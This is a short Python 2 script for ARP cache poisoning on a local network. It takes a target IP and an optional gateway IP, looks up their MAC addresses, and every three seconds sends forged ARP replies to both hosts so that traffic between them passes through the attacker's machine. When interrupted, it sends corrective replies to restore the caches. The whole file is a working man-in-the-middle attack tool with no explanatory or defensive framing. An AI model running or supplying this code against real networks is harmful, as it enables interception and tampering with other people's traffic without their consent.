#!/usr/bin/python
import socket
import struct
import binascii, time
import sys
from subprocess import Popen, PIPE
import re

DEBUG = True

GATEWAY_IP = '192.168.0.1'
GATEWAY_MAC = '6c:19:8f:ba:3c:c4'

def log(msg):
	if DEBUG:
		print msg
def getMacOfIP(ip):
	log('Getting mac of ' + ip)
	Popen(["ping", "-c 1", ip], stdout = PIPE)
	pid = Popen(["arp", "-n", ip], stdout = PIPE)
	s = pid.communicate()[0]
	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	print 'Ok, I got this shit'
	print "Mac of %s is %s" % (ip, mac)
	return mac

def getmac(interface):
	try:
		mac = open('/sys/class/net/'+interface+'/address').readline()
	except:
		mac = "00:00:00:00:00:00"
	return mac[0:17]


def pack_addr(ipaddr):
    
    pkaddr = socket.inet_aton(ipaddr)
    return pkaddr

def pack_mac(macaddr):
    
    hexMac = macaddr.replace(":", '').decode('hex')
    return hexMac

def main():
	s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
	s.bind(('enp3s0', socket.htons(0x0800)))

	if len(sys.argv) < 2:
		print 'Usage: ', sys.argv[0], ' targetIP [gatewayIP]'
		return

	vicIP = pack_addr(sys.argv[1])
	vicMac = pack_mac(getMacOfIP(sys.argv[1]))
	sorc = pack_mac(getmac('enp3s0'))
#	vicMac = pack_mac(raw_input("Input MAC of remote host: "))
#	gateMac = pack_mac(raw_input("Input MAC of gateway: "))
#	vicIP = pack_addr(raw_input("Input IP of Target : "))
#	gateIP = pack_addr(raw_input("Input IP of Gateway: "))
	if len(sys.argv) > 2:
		gateMac = pack_mac(getMacOfIP(sys.argv[2]))
		gateIP = pack_addr(sys.argv[2])
	else:
		gateMac = pack_mac(GATEWAY_MAC)
		gateIP = pack_addr(GATEWAY_IP)

	arp_code = '\x08\x06'
	eth1 = vicMac+sorc+arp_code # remote target
	eth2 = gateMac+sorc+arp_code # gateway

	# ARP header Info
	htype = '\x00\x01'
	protype = '\x08\x00'
	hsize = '\x06'
	psize = '\x04'
	opcode = '\x00\x02'

	# Build ARP Reply
	arp_victim = eth1+htype+protype+hsize+psize+opcode+sorc+gateIP+vicMac+vicIP
	arp_gateway = eth2+htype+protype+hsize+psize+opcode+sorc+vicIP+gateMac+gateIP

	while True:
		try:
			time.sleep(3)
			s.send(arp_victim)
			s.send(arp_gateway)
		except KeyboardInterrupt:
			print 'Cleaning up...'
			arp_victim = vicMac+sorc+arp_code
			arp_victim = arp_victim + htype+protype+hsize+psize+opcode+gateMac+gateIP+vicMac+vicIP
			arp_gateway = gateMac+sorc+arp_code
			arp_gateway = arp_gateway + htype+protype+hsize+psize+opcode+vicMac+vicIP+gateMac+gateIP
			for i in range(0,5):
				s.send(arp_victim)
				s.send(arp_gateway)
				time.sleep(1)
			print 'Ok, powinno byc galante'
			exit()
main()	
